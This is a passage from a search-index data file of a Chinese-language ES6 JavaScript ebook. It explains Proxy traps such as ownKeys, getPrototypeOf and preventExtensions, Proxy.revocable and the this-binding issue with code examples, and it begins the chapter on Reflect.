<p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>defineProperty</code>\u65b9\u6cd5\u8fd4\u56de<code>false</code>\uff0c\u5bfc\u81f4\u6dfb\u52a0\u65b0\u5c5e\u6027\u603b\u662f\u65e0\u6548\u3002</p> <p>\u6ce8\u610f\uff0c\u5982\u679c\u76ee\u6807\u5bf9\u8c61\u4e0d\u53ef\u6269\u5c55\uff08non-extensible\uff09\uff0c\u5219<code>defineProperty</code>\u4e0d\u80fd\u589e\u52a0\u76ee\u6807\u5bf9\u8c61\u4e0a\u4e0d\u5b58\u5728\u7684\u5c5e\u6027\uff0c\u5426\u5219\u4f1a\u62a5\u9519\u3002\u53e6\u5916\uff0c\u5982\u679c\u76ee\u6807\u5bf9\u8c61\u7684\u67d0\u4e2a\u5c5e\u6027\u4e0d\u53ef\u5199\uff08writable\uff09\u6216\u4e0d\u53ef\u914d\u7f6e\uff08configurable\uff09\uff0c\u5219<code>defineProperty</code>\u65b9\u6cd5\u4e0d\u5f97\u6539\u53d8\u8fd9\u4e24\u4e2a\u8bbe\u7f6e\u3002</p>"},{"location":"ebook-JSES6-RYF/14-Proxy/#getownpropertydescriptor","title":"getOwnPropertyDescriptor()","text":"<p><code>getOwnPropertyDescriptor</code>\u65b9\u6cd5\u62e6\u622a<code>Object.getOwnPropertyDescriptor()</code>\uff0c\u8fd4\u56de\u4e00\u4e2a\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\u6216\u8005<code>undefined</code>\u3002</p> <pre><code>var handler = {\n  getOwnPropertyDescriptor (target, key) {\n    if (key[0] === '_') {\n      return;\n    }\n    return Object.getOwnPropertyDescriptor(target, key);\n  }\n};\nvar target = { _foo: 'bar', baz: 'tar' };\nvar proxy = new Proxy(target, handler);\nObject.getOwnPropertyDescriptor(proxy, 'wat')\n// undefined\nObject.getOwnPropertyDescriptor(proxy, '_foo')\n// undefined\nObject.getOwnPropertyDescriptor(proxy, 'baz')\n// { value: 'tar', writable: true, enumerable: true, configurable: true }\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>handler.getOwnPropertyDescriptor</code>\u65b9\u6cd5\u5bf9\u4e8e\u7b2c\u4e00\u4e2a\u5b57\u7b26\u4e3a\u4e0b\u5212\u7ebf\u7684\u5c5e\u6027\u540d\u4f1a\u8fd4\u56de<code>undefined</code>\u3002</p>"},{"location":"ebook-JSES6-RYF/14-Proxy/#getprototypeof","title":"getPrototypeOf()","text":"<p><code>getPrototypeOf</code>\u65b9\u6cd5\u4e3b\u8981\u7528\u6765\u62e6\u622a\u83b7\u53d6\u5bf9\u8c61\u539f\u578b\u3002\u5177\u4f53\u6765\u8bf4\uff0c\u62e6\u622a\u4e0b\u9762\u8fd9\u4e9b\u64cd\u4f5c\u3002</p> <ul> <li><code>Object.prototype.__proto__</code></li> <li><code>Object.prototype.isPrototypeOf()</code></li> <li><code>Object.getPrototypeOf()</code></li> <li><code>Reflect.getPrototypeOf()</code></li> <li><code>instanceof</code></li> </ul> <p>\u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002</p> <pre><code>var proto = {};\nvar p = new Proxy({}, {\n  getPrototypeOf(target) {\n    return proto;\n  }\n});\nObject.getPrototypeOf(p) === proto // true\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>getPrototypeOf</code>\u65b9\u6cd5\u62e6\u622a<code>Object.getPrototypeOf()</code>\uff0c\u8fd4\u56de<code>proto</code>\u5bf9\u8c61\u3002</p> <p>\u6ce8\u610f\uff0c<code>getPrototypeOf</code>\u65b9\u6cd5\u7684\u8fd4\u56de\u503c\u5fc5\u987b\u662f\u5bf9\u8c61\u6216\u8005<code>null</code>\uff0c\u5426\u5219\u62a5\u9519\u3002\u53e6\u5916\uff0c\u5982\u679c\u76ee\u6807\u5bf9\u8c61\u4e0d\u53ef\u6269\u5c55\uff08non-extensible\uff09\uff0c <code>getPrototypeOf</code>\u65b9\u6cd5\u5fc5\u987b\u8fd4\u56de\u76ee\u6807\u5bf9\u8c61\u7684\u539f\u578b\u5bf9\u8c61\u3002</p>"},{"location":"ebook-JSES6-RYF/14-Proxy/#isextensible","title":"isExtensible()","text":"<p><code>isExtensible</code>\u65b9\u6cd5\u62e6\u622a<code>Object.isExtensible</code>\u64cd\u4f5c\u3002</p> <pre><code>var p = new Proxy({}, {\n  isExtensible: function(target) {\n    console.log(\"called\");\n    return true;\n  }\n});\n\nObject.isExtensible(p)\n// \"called\"\n// true\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u8bbe\u7f6e\u4e86<code>isExtensible</code>\u65b9\u6cd5\uff0c\u5728\u8c03\u7528<code>Object.isExtensible</code>\u65f6\u4f1a\u8f93\u51fa<code>called</code>\u3002</p> <p>\u6ce8\u610f\uff0c\u8be5\u65b9\u6cd5\u53ea\u80fd\u8fd4\u56de\u5e03\u5c14\u503c\uff0c\u5426\u5219\u8fd4\u56de\u503c\u4f1a\u88ab\u81ea\u52a8\u8f6c\u4e3a\u5e03\u5c14\u503c\u3002</p> <p>\u8fd9\u4e2a\u65b9\u6cd5\u6709\u4e00\u4e2a\u5f3a\u9650\u5236\uff0c\u5b83\u7684\u8fd4\u56de\u503c\u5fc5\u987b\u4e0e\u76ee\u6807\u5bf9\u8c61\u7684<code>isExtensible</code>\u5c5e\u6027\u4fdd\u6301\u4e00\u81f4\uff0c\u5426\u5219\u5c31\u4f1a\u629b\u51fa\u9519\u8bef\u3002</p> <pre><code>Object.isExtensible(proxy) === Object.isExtensible(target)\n</code></pre> <p>\u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002</p> <pre><code>var p = new Proxy({}, {\n  isExtensible: function(target) {\n    return false;\n  }\n});\n\nObject.isExtensible(p)\n// Uncaught TypeError: 'isExtensible' on proxy: trap result does not reflect extensibility of proxy target (which is 'true')\n</code></pre>"},{"location":"ebook-JSES6-RYF/14-Proxy/#ownkeys","title":"ownKeys()","text":"<p><code>ownKeys</code>\u65b9\u6cd5\u7528\u6765\u62e6\u622a\u5bf9\u8c61\u81ea\u8eab\u5c5e\u6027\u7684\u8bfb\u53d6\u64cd\u4f5c\u3002\u5177\u4f53\u6765\u8bf4\uff0c\u62e6\u622a\u4ee5\u4e0b\u64cd\u4f5c\u3002</p> <ul> <li><code>Object.getOwnPropertyNames()</code></li> <li><code>Object.getOwnPropertySymbols()</code></li> <li><code>Object.keys()</code></li> <li><code>for...in</code>\u5faa\u73af</li> </ul> <p>\u4e0b\u9762\u662f\u62e6\u622a<code>Object.keys()</code>\u7684\u4f8b\u5b50\u3002</p> <pre><code>let target = {\n  a: 1,\n  b: 2,\n  c: 3\n};\n\nlet handler = {\n  ownKeys(target) {\n    return ['a'];\n  }\n};\n\nlet proxy = new Proxy(target, handler);\n\nObject.keys(proxy)\n// [ 'a' ]\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u62e6\u622a\u4e86\u5bf9\u4e8e<code>target</code>\u5bf9\u8c61\u7684<code>Object.keys()</code>\u64cd\u4f5c\uff0c\u53ea\u8fd4\u56de<code>a</code>\u3001<code>b</code>\u3001<code>c</code>\u4e09\u4e2a\u5c5e\u6027\u4e4b\u4e2d\u7684<code>a</code>\u5c5e\u6027\u3002</p> <p>\u4e0b\u9762\u7684\u4f8b\u5b50\u662f\u62e6\u622a\u7b2c\u4e00\u4e2a\u5b57\u7b26\u4e3a\u4e0b\u5212\u7ebf\u7684\u5c5e\u6027\u540d\u3002</p> <pre><code>let target = {\n  _bar: 'foo',\n  _prop: 'bar',\n  prop: 'baz'\n};\n\nlet handler = {\n  ownKeys (target) {\n    return Reflect.ownKeys(target).filter(key =&gt; key[0] !== '_');\n  }\n};\n\nlet proxy = new Proxy(target, handler);\nfor (let key of Object.keys(proxy)) {\n  console.log(target[key]);\n}\n// \"baz\"\n</code></pre> <p>\u6ce8\u610f\uff0c\u4f7f\u7528<code>Object.keys</code>\u65b9\u6cd5\u65f6\uff0c\u6709\u4e09\u7c7b\u5c5e\u6027\u4f1a\u88ab<code>ownKeys</code>\u65b9\u6cd5\u81ea\u52a8\u8fc7\u6ee4\uff0c\u4e0d\u4f1a\u8fd4\u56de\u3002</p> <ul> <li>\u76ee\u6807\u5bf9\u8c61\u4e0a\u4e0d\u5b58\u5728\u7684\u5c5e\u6027</li> <li>\u5c5e\u6027\u540d\u4e3a Symbol \u503c</li> <li>\u4e0d\u53ef\u904d\u5386\uff08<code>enumerable</code>\uff09\u7684\u5c5e\u6027</li> </ul> <pre><code>let target = {\n  a: 1,\n  b: 2,\n  c: 3,\n  [Symbol.for('secret')]: '4',\n};\n\nObject.defineProperty(target, 'key', {\n  enumerable: false,\n  configurable: true,\n  writable: true,\n  value: 'static'\n});\n\nlet handler = {\n  ownKeys(target) {\n    return ['a', 'd', Symbol.for('secret'), 'key'];\n  }\n};\n\nlet proxy = new Proxy(target, handler);\n\nObject.keys(proxy)\n// ['a']\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>ownKeys</code>\u65b9\u6cd5\u4e4b\u4e2d\uff0c\u663e\u5f0f\u8fd4\u56de\u4e0d\u5b58\u5728\u7684\u5c5e\u6027\uff08<code>d</code>\uff09\u3001Symbol \u503c\uff08<code>Symbol.for('secret')</code>\uff09\u3001\u4e0d\u53ef\u904d\u5386\u7684\u5c5e\u6027\uff08<code>key</code>\uff09\uff0c\u7ed3\u679c\u90fd\u88ab\u81ea\u52a8\u8fc7\u6ee4\u6389\u3002</p> <p><code>ownKeys</code>\u65b9\u6cd5\u8fd8\u53ef\u4ee5\u62e6\u622a<code>Object.getOwnPropertyNames()</code>\u3002</p> <pre><code>var p = new Proxy({}, {\n  ownKeys: function(target) {\n    return ['a', 'b', 'c'];\n  }\n});\n\nObject.getOwnPropertyNames(p)\n// [ 'a', 'b', 'c' ]\n</code></pre> <p><code>for...in</code>\u5faa\u73af\u4e5f\u53d7\u5230<code>ownKeys</code>\u65b9\u6cd5\u7684\u62e6\u622a\u3002</p> <pre><code>const obj = { hello: 'world' };\nconst proxy = new Proxy(obj, {\n  ownKeys: function () {\n    return ['a', 'b'];\n  }\n});\n\nfor (let key in proxy) {\n  console.log(key); // \u6ca1\u6709\u4efb\u4f55\u8f93\u51fa\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>ownkeys</code>\u6307\u5b9a\u53ea\u8fd4\u56de<code>a</code>\u548c<code>b</code>\u5c5e\u6027\uff0c\u7531\u4e8e<code>obj</code>\u6ca1\u6709\u8fd9\u4e24\u4e2a\u5c5e\u6027\uff0c\u56e0\u6b64<code>for...in</code>\u5faa\u73af\u4e0d\u4f1a\u6709\u4efb\u4f55\u8f93\u51fa\u3002</p> <p><code>ownKeys</code>\u65b9\u6cd5\u8fd4\u56de\u7684\u6570\u7ec4\u6210\u5458\uff0c\u53ea\u80fd\u662f\u5b57\u7b26\u4e32\u6216 Symbol \u503c\u3002\u5982\u679c\u6709\u5176\u4ed6\u7c7b\u578b\u7684\u503c\uff0c\u6216\u8005\u8fd4\u56de\u7684\u6839\u672c\u4e0d\u662f\u6570\u7ec4\uff0c\u5c31\u4f1a\u62a5\u9519\u3002</p> <pre><code>var obj = {};\n\nvar p = new Proxy(obj, {\n  ownKeys: function(target) {\n    return [123, true, undefined, null, {}, []];\n  }\n});\n\nObject.getOwnPropertyNames(p)\n// Uncaught TypeError: 123 is not a valid property name\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>ownKeys</code>\u65b9\u6cd5\u867d\u7136\u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\uff0c\u4f46\u662f\u6bcf\u4e00\u4e2a\u6570\u7ec4\u6210\u5458\u90fd\u4e0d\u662f\u5b57\u7b26\u4e32\u6216 Symbol \u503c\uff0c\u56e0\u6b64\u5c31\u62a5\u9519\u4e86\u3002</p> <p>\u5982\u679c\u76ee\u6807\u5bf9\u8c61\u81ea\u8eab\u5305\u542b\u4e0d\u53ef\u914d\u7f6e\u7684\u5c5e\u6027\uff0c\u5219\u8be5\u5c5e\u6027\u5fc5\u987b\u88ab<code>ownKeys</code>\u65b9\u6cd5\u8fd4\u56de\uff0c\u5426\u5219\u62a5\u9519\u3002</p> <pre><code>var obj = {};\nObject.defineProperty(obj, 'a', {\n  configurable: false,\n  enumerable: true,\n  value: 10 }\n);\n\nvar p = new Proxy(obj, {\n  ownKeys: function(target) {\n    return ['b'];\n  }\n});\n\nObject.getOwnPropertyNames(p)\n// Uncaught TypeError: 'ownKeys' on proxy: trap result did not include 'a'\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>obj</code>\u5bf9\u8c61\u7684<code>a</code>\u5c5e\u6027\u662f\u4e0d\u53ef\u914d\u7f6e\u7684\uff0c\u8fd9\u65f6<code>ownKeys</code>\u65b9\u6cd5\u8fd4\u56de\u7684\u6570\u7ec4\u4e4b\u4e2d\uff0c\u5fc5\u987b\u5305\u542b<code>a</code>\uff0c\u5426\u5219\u4f1a\u62a5\u9519\u3002</p> <p>\u53e6\u5916\uff0c\u5982\u679c\u76ee\u6807\u5bf9\u8c61\u662f\u4e0d\u53ef\u6269\u5c55\u7684\uff08non-extensible\uff09\uff0c\u8fd9\u65f6<code>ownKeys</code>\u65b9\u6cd5\u8fd4\u56de\u7684\u6570\u7ec4\u4e4b\u4e2d\uff0c\u5fc5\u987b\u5305\u542b\u539f\u5bf9\u8c61\u7684\u6240\u6709\u5c5e\u6027\uff0c\u4e14\u4e0d\u80fd\u5305\u542b\u591a\u4f59\u7684\u5c5e\u6027\uff0c\u5426\u5219\u62a5\u9519\u3002</p> <pre><code>var obj = {\n  a: 1\n};\n\nObject.preventExtensions(obj);\n\nvar p = new Proxy(obj, {\n  ownKeys: function(target) {\n    return ['a', 'b'];\n  }\n});\n\nObject.getOwnPropertyNames(p)\n// Uncaught TypeError: 'ownKeys' on proxy: trap returned extra keys but proxy target is non-extensible\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>obj</code>\u5bf9\u8c61\u662f\u4e0d\u53ef\u6269\u5c55\u7684\uff0c\u8fd9\u65f6<code>ownKeys</code>\u65b9\u6cd5\u8fd4\u56de\u7684\u6570\u7ec4\u4e4b\u4e2d\uff0c\u5305\u542b\u4e86<code>obj</code>\u5bf9\u8c61\u7684\u591a\u4f59\u5c5e\u6027<code>b</code>\uff0c\u6240\u4ee5\u5bfc\u81f4\u4e86\u62a5\u9519\u3002</p>"},{"location":"ebook-JSES6-RYF/14-Proxy/#preventextensions","title":"preventExtensions()","text":"<p><code>preventExtensions</code>\u65b9\u6cd5\u62e6\u622a<code>Object.preventExtensions()</code>\u3002\u8be5\u65b9\u6cd5\u5fc5\u987b\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u5426\u5219\u4f1a\u88ab\u81ea\u52a8\u8f6c\u4e3a\u5e03\u5c14\u503c\u3002</p> <p>\u8fd9\u4e2a\u65b9\u6cd5\u6709\u4e00\u4e2a\u9650\u5236\uff0c\u53ea\u6709\u76ee\u6807\u5bf9\u8c61\u4e0d\u53ef\u6269\u5c55\u65f6\uff08\u5373<code>Object.isExtensible(proxy)</code>\u4e3a<code>false</code>\uff09\uff0c<code>proxy.preventExtensions</code>\u624d\u80fd\u8fd4\u56de<code>true</code>\uff0c\u5426\u5219\u4f1a\u62a5\u9519\u3002</p> <pre><code>var proxy = new Proxy({}, {\n  preventExtensions: function(target) {\n    return true;\n  }\n});\n\nObject.preventExtensions(proxy)\n// Uncaught TypeError: 'preventExtensions' on proxy: trap returned truish but the proxy target is extensible\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>proxy.preventExtensions</code>\u65b9\u6cd5\u8fd4\u56de<code>true</code>\uff0c\u4f46\u8fd9\u65f6<code>Object.isExtensible(proxy)</code>\u4f1a\u8fd4\u56de<code>true</code>\uff0c\u56e0\u6b64\u62a5\u9519\u3002</p> <p>\u4e3a\u4e86\u9632\u6b62\u51fa\u73b0\u8fd9\u4e2a\u95ee\u9898\uff0c\u901a\u5e38\u8981\u5728<code>proxy.preventExtensions</code>\u65b9\u6cd5\u91cc\u9762\uff0c\u8c03\u7528\u4e00\u6b21<code>Object.preventExtensions</code>\u3002</p> <pre><code>var proxy = new Proxy({}, {\n  preventExtensions: function(target) {\n    console.log('called');\n    Object.preventExtensions(target);\n    return true;\n  }\n});\n\nObject.preventExtensions(proxy)\n// \"called\"\n// Proxy {}\n</code></pre>"},{"location":"ebook-JSES6-RYF/14-Proxy/#setprototypeof","title":"setPrototypeOf()","text":"<p><code>setPrototypeOf</code>\u65b9\u6cd5\u4e3b\u8981\u7528\u6765\u62e6\u622a<code>Object.setPrototypeOf</code>\u65b9\u6cd5\u3002</p> <p>\u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002</p> <pre><code>var handler = {\n  setPrototypeOf (target, proto) {\n    throw new Error('Changing the prototype is forbidden');\n  }\n};\nvar proto = {};\nvar target = function () {};\nvar proxy = new Proxy(target, handler);\nObject.setPrototypeOf(proxy, proto);\n// Error: Changing the prototype is forbidden\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53ea\u8981\u4fee\u6539<code>target</code>\u7684\u539f\u578b\u5bf9\u8c61\uff0c\u5c31\u4f1a\u62a5\u9519\u3002</p> <p>\u6ce8\u610f\uff0c\u8be5\u65b9\u6cd5\u53ea\u80fd\u8fd4\u56de\u5e03\u5c14\u503c\uff0c\u5426\u5219\u4f1a\u88ab\u81ea\u52a8\u8f6c\u4e3a\u5e03\u5c14\u503c\u3002\u53e6\u5916\uff0c\u5982\u679c\u76ee\u6807\u5bf9\u8c61\u4e0d\u53ef\u6269\u5c55\uff08non-extensible\uff09\uff0c<code>setPrototypeOf</code>\u65b9\u6cd5\u4e0d\u5f97\u6539\u53d8\u76ee\u6807\u5bf9\u8c61\u7684\u539f\u578b\u3002</p>"},{"location":"ebook-JSES6-RYF/14-Proxy/#proxyrevocable","title":"Proxy.revocable()","text":"<p><code>Proxy.revocable</code>\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u53ef\u53d6\u6d88\u7684 Proxy \u5b9e\u4f8b\u3002</p> <pre><code>let target = {};\nlet handler = {};\n\nlet {proxy, revoke} = Proxy.revocable(target, handler);\n\nproxy.foo = 123;\nproxy.foo // 123\n\nrevoke();\nproxy.foo // TypeError: Revoked\n</code></pre> <p><code>Proxy.revocable</code>\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5bf9\u8c61\uff0c\u8be5\u5bf9\u8c61\u7684<code>proxy</code>\u5c5e\u6027\u662f<code>Proxy</code>\u5b9e\u4f8b\uff0c<code>revoke</code>\u5c5e\u6027\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u53ef\u4ee5\u53d6\u6d88<code>Proxy</code>\u5b9e\u4f8b\u3002\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5f53\u6267\u884c<code>revoke</code>\u51fd\u6570\u4e4b\u540e\uff0c\u518d\u8bbf\u95ee<code>Proxy</code>\u5b9e\u4f8b\uff0c\u5c31\u4f1a\u629b\u51fa\u4e00\u4e2a\u9519\u8bef\u3002</p> <p><code>Proxy.revocable</code>\u7684\u4e00\u4e2a\u4f7f\u7528\u573a\u666f\u662f\uff0c\u76ee\u6807\u5bf9\u8c61\u4e0d\u5141\u8bb8\u76f4\u63a5\u8bbf\u95ee\uff0c\u5fc5\u987b\u901a\u8fc7\u4ee3\u7406\u8bbf\u95ee\uff0c\u4e00\u65e6\u8bbf\u95ee\u7ed3\u675f\uff0c\u5c31\u6536\u56de\u4ee3\u7406\u6743\uff0c\u4e0d\u5141\u8bb8\u518d\u6b21\u8bbf\u95ee\u3002</p>"},{"location":"ebook-JSES6-RYF/14-Proxy/#this","title":"this \u95ee\u9898","text":"<p>\u867d\u7136 Proxy \u53ef\u4ee5\u4ee3\u7406\u9488\u5bf9\u76ee\u6807\u5bf9\u8c61\u7684\u8bbf\u95ee\uff0c\u4f46\u5b83\u4e0d\u662f\u76ee\u6807\u5bf9\u8c61\u7684\u900f\u660e\u4ee3\u7406\uff0c\u5373\u4e0d\u505a\u4efb\u4f55\u62e6\u622a\u7684\u60c5\u51b5\u4e0b\uff0c\u4e5f\u65e0\u6cd5\u4fdd\u8bc1\u4e0e\u76ee\u6807\u5bf9\u8c61\u7684\u884c\u4e3a\u4e00\u81f4\u3002\u4e3b\u8981\u539f\u56e0\u5c31\u662f\u5728 Proxy \u4ee3\u7406\u7684\u60c5\u51b5\u4e0b\uff0c\u76ee\u6807\u5bf9\u8c61\u5185\u90e8\u7684<code>this</code>\u5173\u952e\u5b57\u4f1a\u6307\u5411 Proxy \u4ee3\u7406\u3002</p> <pre><code>const target = {\n  m: function () {\n    console.log(this === proxy);\n  }\n};\nconst handler = {};\n\nconst proxy = new Proxy(target, handler);\n\ntarget.m() // false\nproxy.m()  // true\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4e00\u65e6<code>proxy</code>\u4ee3\u7406<code>target.m</code>\uff0c\u540e\u8005\u5185\u90e8\u7684<code>this</code>\u5c31\u662f\u6307\u5411<code>proxy</code>\uff0c\u800c\u4e0d\u662f<code>target</code>\u3002</p> <p>\u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\uff0c\u7531\u4e8e<code>this</code>\u6307\u5411\u7684\u53d8\u5316\uff0c\u5bfc\u81f4 Proxy \u65e0\u6cd5\u4ee3\u7406\u76ee\u6807\u5bf9\u8c61\u3002</p> <pre><code>const _name = new WeakMap();\n\nclass Person {\n  constructor(name) {\n    _name.set(this, name);\n  }\n  get name() {\n    return _name.get(this);\n  }\n}\n\nconst jane = new Person('Jane');\njane.name // 'Jane'\n\nconst proxy = new Proxy(jane, {});\nproxy.name // undefined\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u76ee\u6807\u5bf9\u8c61<code>jane</code>\u7684<code>name</code>\u5c5e\u6027\uff0c\u5b9e\u9645\u4fdd\u5b58\u5728\u5916\u90e8<code>WeakMap</code>\u5bf9\u8c61<code>_name</code>\u4e0a\u9762\uff0c\u901a\u8fc7<code>this</code>\u952e\u533a\u5206\u3002\u7531\u4e8e\u901a\u8fc7<code>proxy.name</code>\u8bbf\u95ee\u65f6\uff0c<code>this</code>\u6307\u5411<code>proxy</code>\uff0c\u5bfc\u81f4\u65e0\u6cd5\u53d6\u5230\u503c\uff0c\u6240\u4ee5\u8fd4\u56de<code>undefined</code>\u3002</p> <p>\u6b64\u5916\uff0c\u6709\u4e9b\u539f\u751f\u5bf9\u8c61\u7684\u5185\u90e8\u5c5e\u6027\uff0c\u53ea\u6709\u901a\u8fc7\u6b63\u786e\u7684<code>this</code>\u624d\u80fd\u62ff\u5230\uff0c\u6240\u4ee5 Proxy \u4e5f\u65e0\u6cd5\u4ee3\u7406\u8fd9\u4e9b\u539f\u751f\u5bf9\u8c61\u7684\u5c5e\u6027\u3002</p> <pre><code>const target = new Date();\nconst handler = {};\nconst proxy = new Proxy(target, handler);\n\nproxy.getDate();\n// TypeError: this is not a Date object.\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>getDate</code>\u65b9\u6cd5\u53ea\u80fd\u5728<code>Date</code>\u5bf9\u8c61\u5b9e\u4f8b\u4e0a\u9762\u62ff\u5230\uff0c\u5982\u679c<code>this</code>\u4e0d\u662f<code>Date</code>\u5bf9\u8c61\u5b9e\u4f8b\u5c31\u4f1a\u62a5\u9519\u3002\u8fd9\u65f6\uff0c<code>this</code>\u7ed1\u5b9a\u539f\u59cb\u5bf9\u8c61\uff0c\u5c31\u53ef\u4ee5\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002</p> <pre><code>const target = new Date('2015-01-01');\nconst handler = {\n  get(target, prop) {\n    if (prop === 'getDate') {\n      return target.getDate.bind(target);\n    }\n    return Reflect.get(target, prop);\n  }\n};\nconst proxy = new Proxy(target, handler);\n\nproxy.getDate() // 1\n</code></pre>"},{"location":"ebook-JSES6-RYF/14-Proxy/#web","title":"\u5b9e\u4f8b\uff1aWeb \u670d\u52a1\u7684\u5ba2\u6237\u7aef","text":"<p>Proxy \u5bf9\u8c61\u53ef\u4ee5\u62e6\u622a\u76ee\u6807\u5bf9\u8c61\u7684\u4efb\u610f\u5c5e\u6027\uff0c\u8fd9\u4f7f\u5f97\u5b83\u5f88\u5408\u9002\u7528\u6765\u5199 Web \u670d\u52a1\u7684\u5ba2\u6237\u7aef\u3002</p> <pre><code>const service = createWebService('http://example.com/data');\n\nservice.employees().then(json =&gt; {\n  const employees = JSON.parse(json);\n  // \u00b7\u00b7\u00b7\n});\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u65b0\u5efa\u4e86\u4e00\u4e2a Web \u670d\u52a1\u7684\u63a5\u53e3\uff0c\u8fd9\u4e2a\u63a5\u53e3\u8fd4\u56de\u5404\u79cd\u6570\u636e\u3002Proxy \u53ef\u4ee5\u62e6\u622a\u8fd9\u4e2a\u5bf9\u8c61\u7684\u4efb\u610f\u5c5e\u6027\uff0c\u6240\u4ee5\u4e0d\u7528\u4e3a\u6bcf\u4e00\u79cd\u6570\u636e\u5199\u4e00\u4e2a\u9002\u914d\u65b9\u6cd5\uff0c\u53ea\u8981\u5199\u4e00\u4e2a Proxy \u62e6\u622a\u5c31\u53ef\u4ee5\u4e86\u3002</p> <pre><code>function createWebService(baseUrl) {\n  return new Proxy({}, {\n    get(target, propKey, receiver) {\n      return () =&gt; httpGet(baseUrl+'/' + propKey);\n    }\n  });\n}\n</code></pre> <p>\u540c\u7406\uff0cProxy \u4e5f\u53ef\u4ee5\u7528\u6765\u5b9e\u73b0\u6570\u636e\u5e93\u7684 ORM \u5c42\u3002</p>"},{"location":"ebook-JSES6-RYF/15-Reflect/","title":"Reflect","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 15752  \u9605\u8bfb32\u5206\u949f</p>"},{"location":"ebook-JSES6-RYF/15-Reflect/#_1","title":"\u4ecb\u7ecd","text":"<p><code>Reflect</code>\u5bf9\u8c61\u7684\u8bbe\u8ba1\u76ee\u7684\u6709\u8fd9\u6837\u51e0\u4e2a\u3002</p> <p>\uff081\uff09 \u5c06<code>Object</code>\u5bf9\u8c61\u7684\u4e00\u4e9b\u660e\u663e\u5c5e\u4e8e\u8bed\u8a00\u5185\u90e8\u7684\u65b9\u6cd5\uff08\u6bd4\u5982<code>Object.defineProperty</code>\uff09\uff0c\u653e\u5230<code>Reflect</code>\u5bf9\u8c61\u4e0a\u3002\u73b0\u9636\u6bb5\uff0c\u67d0\u4e9b\u65b9\u6cd5\u540c\u65f6\u5728<code>Object</code>\u548c<code>Reflect</code>\u5bf9\u8c61\u4e0a\u90e8\u7f72\uff0c\u672a\u6765\u7684\u65b0\u65b9\u6cd5\u5c06\u53ea\u90e8\u7f72\u5728<code>Reflect</code>\u5bf9\u8c61\u4e0a\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u4ece<code>Reflect</code>\u5bf9\u8c61\u4e0a\u53ef\u4ee5\u62ff\u5230\u8bed\u8a00\u5185\u90e8\u7684\u65b9\u6cd5\u3002</p> <p>\uff082\uff09 \u4fee\u6539\u67d0\u4e9b<code>Object</code>\u65b9\u6cd5\u7684\u8fd4\u56de\u7ed3\u679c\uff0c\u8ba9\u5176\u53d8\u5f97\u66f4\u5408\u7406\u3002\u6bd4\u5982\uff0c<code>Object.defineProperty(obj, name, desc)</code>\u5728\u65e0\u6cd5\u5b9a\u4e49\u5c5e\u6027\u65f6\uff0c\u4f1a\u629b\u51fa\u4e00\u4e2a\u9519\u8bef\uff0c\u800c<code>Reflect.defineProperty(obj, name, desc)</code>\u5219\u4f1a\u8fd4\u56de<code>false</code>\u3002</p> <pre><code>// \u8001\u5199\u6cd5\ntry {\n  Object.defineProperty(target, property, attributes);\n  // success\n} catch (e) {\n  // failure\n}\n\n// \u65b0\u5199\u6cd5\nif (Reflect.defineProperty(target, property, attributes)) {\n  // success\n} else {\n  // failure\n}\n</code></pre> <p>\uff083\uff09 \u8ba9<code>Object</code>\u64cd\u4f5c\u90fd\u53d8\u6210\u51fd\u6570\u884c\u4e3a\u3002\u67d0\u4e9b<code>Object</code>\u64cd\u4f5c\u662f\u547d\u4ee4\u5f0f\uff0c\u6bd4\u5982<code>name in obj</code>\u548c<code>delete obj[name]</code>\uff0c\u800c<code>Reflect.has(obj, name)</code>\u548c<code>Reflect.deleteProperty(obj, name)</code>\u8ba9\u5b83\u4eec\u53d8\u6210\u4e86\u51fd\u6570\u884c\u4e3a\u3002</p> <pre><code>// \u8001\u5199\u6cd5\n'assign' in Object // true\n\n// \u65b0\u5199\u6cd5\nReflect.has(Object, 'assign') // true\n</code></pre> 